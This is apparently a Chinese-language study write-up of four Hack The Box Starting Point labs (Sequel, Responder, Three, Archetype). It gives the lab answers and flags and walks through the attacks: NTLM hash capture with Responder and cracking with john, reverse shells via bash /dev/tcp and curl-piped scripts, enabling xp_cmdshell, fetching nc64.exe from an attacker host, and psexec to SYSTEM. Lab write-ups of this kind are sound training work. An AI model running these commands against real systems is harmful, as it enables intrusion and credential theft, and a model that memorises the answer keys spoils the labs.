# Staring Point-Tier1:

## Sequel：

```
Task 1

During our scan, which port do we find serving MySQL?

***6
3306

Hide Answer
Task 2

What community-developed MySQL version is the target running?

******B
MariaDB          MariaDB 是 MySQL 的一个分支

Hide Answer
Task 3

When using the MySQL command line client, what switch do we need to use in order to specify a login username?

**
-u                    -h:指定主机（ip）  -P:指定端口   -p 指定密码，为空则控制台输入
					mysql -h xxx.xxx.xx.xxx  -p
Hide Answer
Task 4

Which username allows us to log into this MariaDB instance without providing a password?

***t
root

Hide Answer
Task 5

In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?

*               
*

Hide Answer
Task 6

In SQL, what symbol do we need to end each query with?

*
;                  堆叠注入就是利用;

Hide Answer
Task 7

There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?

***               show databases;
htb

Hide Answer
Submit Flag                       use htb;show tables;select * from xxx;

Submit root flag   

********************************
7b4bec00d1a39e3dd4e021ec3d915da8
```

| **DDL** | 数据定义语言 | **定义和管理**数据库、表结构 | `CREATE`, `ALTER`, `DROP`, `SHOW`      |
| ------- | ------------ | ---------------------------- | -------------------------------------- |
| **DML** | 数据操作语言 | **操作**表中的**数据**本身   | `SELECT`, `INSERT`, `UPDATE`, `DELETE` |

它们都是SQL，但是像show属于DDL，并不直接操作数据，而是操作数据库、表结构。

## Responder:

题目名字responder是一个工具，常用于内网渗透测试中**网络协议欺骗和凭证捕获**

核心功能有 LLMNR/NBT-NS/MDNS 毒化、SMB/HTTP 等协议模拟、NTLMv1/v2 哈希捕获、WPAD 代理投毒

**LLMNR/NBT-NS/MDNS**：

这三个协议的作用都是在本地网络中无DNS服务器的情况下，通过广播或多播的方式，根据主机名来解析IP地址的协议。

**NTLMv1/v2 **:全称是`New Technology Lan Manager`，主要用于 **Windows 域环境或工作组环境** 下的**内部网络服务**身份验证。和Kerberos一样（kerberos更安全，首选）。它们都用于内网认证。像HTTP认证内外网潜泳，但是外网更常见。

NTML协议的工作过程是经典的”挑战/应答“，服务端发出一个字符串，客户端根据密码计算Hash，服务端收到进行比对。

responder的工作原理就是，LLMNR/NBT-NS/MDNS这三个协议解析主机名的时候，发送的是多播或广播，攻击者可以第一个响应，伪装成目标主机。responder内置可以伪造服务，比如SMB，要求对方进行NTML身份验证。那么受害主机就会发送用户的**Net-NTLMv2 Hash**，可以用hashcat或者john破解。

这题首先是web页面有一个文件包含漏洞，且可以进行远程文件包含。我们让它访问我们主机的smb服务，启用responder监听获取NTLM Hash，破解出密码。靶机开放了5985端口，运行的是Winrm（windows remote management），类似3389端口的rdp，也可以进行远程连接连接。我们利用工具`evil-winrm`就可以用破解出的密码远程登录。

首先nmap扫一下：

```
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
```

然后找到文件包含的参数是page

`responder -I tun0`因为我们通过opevpn连接的，所以这里要监听tun0。

浏览器访问`?page=//10.10.16.31/somefile`触发远程文件包含，目标靶机**windwos系统**识别到网络主机名**自动**访问了我们攻击机器的smb服务，responder就监听到了NTLM Hash

```
[SMB] NTLMv2-SSP Client   : 10.129.251.135
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:d4e77aad67f6cffc:DC08BE06ABDEECC8F7731F691BCC3009:0101000000000000006AFBE21B27DC01D4FE9A472D0D2F4D0000000002000800460036005400550001001E00570049004E002D0047003300360055005A0044004200420046003600530004003400570049004E002D0047003300360055005A004400420042004600360053002E0046003600540055002E004C004F00430041004C000300140046003600540055002E004C004F00430041004C000500140046003600540055002E004C004F00430041004C0007000800006AFBE21B27DC01060004000200000008003000300000000000000001000000002000002234C6F3434C71D5A26032BDE1E2392469E125E137CD08A0C7C10C0845DB99CD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330031000000000000000000
```

放到`John the ripper`跑一下，得到密码是badminton，最后evil-winrm连接即可

`# john -w=/usr/share/wordlists/rockyou.txt hash.txt `

这里讲讲这个rockyou.txt，它在网络安全领域非常有名，源自于2009年发生的一次中大数据泄露，Rockyou公司用明文存储密码，导致数千万用户的密码被曝光。

```
Task 1

When visiting the web service using the IP address, what is the domain that we are being redirected to?

*****.**b
unika.htb

Hide Answer
Task 2

Which scripting language is being used on the server to generate webpages?

***
php

Hide Answer
Task 3

What is the name of the URL parameter which is used to load different language versions of the webpage?

***e
page

Hide Answer
Task 4

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

../../../../../../../../*******/********/*******/***/****s
../../../../../../../../windows/system32/drivers/etc/hosts

Hide Answer
Task 5

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

//**.**.**.*/*******e
//10.10.14.6/somefile

Hide Answer
Task 6

What does NTLM stand for?

*** ********** *** ******r
New Technology Lan Manager

Hide Answer
Task 7

Which flag do we use in the Responder utility to specify the network interface?

**
-I

Hide Answer
Task 8

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

**** *** *****r
john the ripper

Hide Answer
Task 9

What is the password for the administrator user?

********n
badminton

Hide Answer
Task 10

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

***5
5985

Hide Answer
Submit Flag

Submit root flag

********************************
ea81b7afddd03efaa0945333ed147fac

Hide Answer
```

## Three：

```
Task 1

How many TCP ports are open?

*
2

Hide Answer
Task 2

What is the domain of the email address provided in the "Contact" section of the website?

**********.**b
thetoppers.htb

Hide Answer
Task 3

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?

/***/****s
/etc/hosts

Hide Answer
Task 4

Which sub-domain is discovered during further enumeration?

**.**********.**b
s3.thetoppers.htb

Hide Answer
Task 5

Which service is running on the discovered sub-domain?

****** *3
Amazon S3

Hide Answer
Task 6

Which command line utility can be used to interact with the service running on the discovered sub-domain?

*****i
awscli

Hide Answer
Task 7

Which command is used to set up the AWS CLI installation?

*** ********e
aws configure

Hide Answer
Task 8

What is the command used by the above utility to list all of the S3 buckets?

*** ** *s
aws s3 ls

Hide Answer
Task 9

This server is configured to run files written in what web scripting language?

***
php

Hide Answer
Submit Flag

Submit root flag

********************************
a980d99281a28d638ac68b9bf9453c2b

Hide Answer
```

首先扫描结果两个端口，登录到web页面看一眼。它提示页面上的thetoppers.htb是这个ip的域名，我们修改一下/etc/hosts文件，加入这个域名和ip。

接着提示找子域名了。有很多工具，wfuzz,ffuf等。这里我们和writeup中一样，使用gobuster

```
gobuster vhost -u http://10.129.20.177 --domain thetoppers.htb --append-domain -w /usr/share/wordlists/subdomains-top1million-5000.txt
```

这里字典是在github上找到的。vhost模式是虚拟主机模式，通过HTTP请求而不是DNS查询暴力猜测，不依赖DNS服务器。这里是虚拟环境下要用vhost模式。

找到子域名`s3.thetoppers.htb`先把这个域名加入/etc/hosts文件中。

s3开头的子域名对应的是亚马逊S3服务。这是一个云存储服务。我们可以使用官方工具`awscli`连上，管理`thetoppers.htb`

先`aws configure`进行配置

再`aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`

列出thetoppers.htb下的所有文件，然后通过

`aws --endpoint=http://s3.thetoppers.htb s3 cp xxx s3://thetoppers.htb`

上传文件。既然能上传文件，我们姿势就很多了。最简单就是上传一个webshell，想反弹shell的话直接`cmd=bash -c ‘bash -i >& /dev/tcp/<ip>/<port> 0>&1`

也可以用nc反弹。

他这里是写了一个.sh脚本，包含了反弹shell的语句，然后通过curl  访问攻击者的服务器（python3快速搭建）上的这个脚本 ，再通过管道符交给bash执行

`cmd=curl http://<ip>:<port>/shell.sh|bash`



amason S3  还是有点不清楚，这里是怎么配置的可以直接上传文件了？

查到的是--endpoint导致不是发给Amason S3而是这个靶机自己定义的S3服务。靶机把名为

thetoppers.htb的s3存储桶刚好配置成网站的根目录，你通过aws操作存储桶，刚好就是操作网站根目录。

## Archetype：

nmap扫一下：

```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
```

首先是445端口的SMB服务，这是漏洞常客了。根据提示，我们直接用smbclient无密码连接，先`-L`看一下有哪些文件

```
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

用$结束的都是要管理员权限的，这里backups就不用

`smbclient //10.129.83.111/backups`访问一下，`get`下载其中文件

```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>      
```

这里用用户名密码，`Data Source`字段结合扫出来的1433端口上有`SQL Server`服务，我们猜测是连接它的用户名密码。这里我们需要用到`impacket`工具包中的`mssqlclient.py`.首先了解什么是impacket包：

> Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.

github地址：https://github.com/fortra/impacket

核心特点：

- 协议的低级实现
- 专注于身份验证和执行
- 无需在目标上安装软件

它提供了一整套**开箱即用的“攻击链”工具**，几乎覆盖了在内网中横向移动的所有关键场景

我们使用如下：

`python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth`

这里为什么要 -windows-auth?因为我们找到的用户名密码就是windows域用户账户

`ARCHETYPE\sql_svc`前面的`ARCHETYPE`是域名，后面的`sql_svc`是用户名

> **一个Windows域是一个由运行Windows系统的计算机和其他设备组成的网络，但这个网络的核心特征是其拥有一个集中式的安全和管理的权威——域控制器（Domain Controller）**

我们可以用域用户的账户密码登录mssql（底层会使用 **NTLM** 或 **Kerberos** 协议）

连接上mssql之后，我们的目标就是“臭名昭著”的`xp_cmdshell`。

`xp_cmdshell`是一个系统扩展存储过程。存储过程就是预编译好的sql语句，存放在那等你传入参数使用。

它的核心功能是：**在 SQL Server 所在的 Windows 操作系统上，创建一个 Windows 命令 shell（即 `cmd.exe`），并传入一个字符串命令供其执行**。

简单来说就是允许任意命令执行。

先确认我们在mssql中的权限：

`SELECT is_srvrolemember('sysadmin');`

返回1代表True，我们有管理员权限

先看看xp_cmdshell是否开了，随便执行一个windows命令：

`EXEC xp_cmdshell 'net user';`

返回结果显示`SQL Server blocked access to procedure 'sys.xp_cmdshell'`那我们就要启用

xp_cmdshell了

```
-- 首先展示高级选项
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
GO

-- 启用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO

-- 完成后，可以再次隐藏高级选项（可选）
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;
GO
```

开启之后，我们就相当于可以执行windows指令了。

先查看一下当前目录：

`SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c pwd";`

发现是`C:\Windows\system32`，作为一个普通用户，我们无法在这个系统目录下下载文件，因此我们需要先切换到别的目录中去：

```
 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe"
```

这里kali中记得提前开http服务并准备好用于反弹shell的nc64.exe

然后就是执行nc64.exe，反弹shell到我们的kali上：
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
10.10.14.9 2333"
```

成功拿到shell！

flag在`C:\Users\sql_svc\Desktop\user.txt`中，因为是cmd，读取文件内容用`type`

接下来是一个提权的问题，我们只是一个普通用户，还需要拿到admin的flag，就需要进行提权。

这里根据writeup利用`winPEAS`工具，先下载到kali中，然后开http服务，让靶机下载这个文件并执行：

```
wget http://10.10.16.31:8080/winPEASx64.exe -outfile winPEASx64.exe
.\winPEASx64.exe
```

关键信息如下：

![image-20250917105838988](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250917105838988.png)

![image-20250917105919259](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250917105919259.png)

`SeImpersonatePrivilege`是一个非常重要的windwos权限，允许**模仿**（Impersonate）其他用户的安全上下文。默认情况下，**IIS 应用程序池** 或 **SQL Server 服务账户** 通常就拥有此权限。拥有此权限时，我们可以针对一系列称作“Potato”漏洞进行攻击。

土豆攻击原理就是利用Windows身份验证机制中的缺陷，诱骗系统高权限账户（如SYSTEM）向攻击者控制的进程进行身份验证，然后窃取并模仿（利用SeImpersonatePrivilege权限）其令牌（Token）。

这里其实用不到，因为在ConsoleHost_history.txt中有admin的密码`MEGACORP_4dm1n!!`

这里因为开放了445端口的SMB服务，我们利用impacket工具包的`psexec.py`进行连接

```
python3 ../my_tools/impacket/examples/psexec.py administrator@10.129.133.231
Impacket v0.13.0.dev0+20250912.114226.b742bd4d - Copyright Fortra, LLC and its affiliated companies 

Password:
```

```
C:\Windows\system32> whoami                                                                               nt authority\system
```

可以看到，成功提权，flag在admin用户的Desktop文件夹中

```
Task 1

Which TCP port is hosting a database server?

***3
1433

Hide Answer
Task 2

What is the name of the non-Administrative share available over SMB?

******s
backups

Hide Answer
Task 3

What is the password identified in the file on the SMB share?

**********3
M3g4c0rp123

Hide Answer
Task 4

What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

***********.*y
mssqlclient.py

Hide Answer
Task 5

What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

**_*******l
xp_cmdshell

Hide Answer
Task 6

What script can be used in order to search possible paths to escalate privileges on Windows hosts?

******s
winpeas

Hide Answer
Task 7

What file contains the administrator's password?

***********_*******.**t
ConsoleHost_history.txt

Hide Answer
Submit Flag

Submit user flag

********************************
3e7b102e78218e935bf3f4951fec21a3

Hide Answer
Submit Flag

Submit root flag

********************************
b91ccec3305e98240082d4474b848528

Hide Answer
```

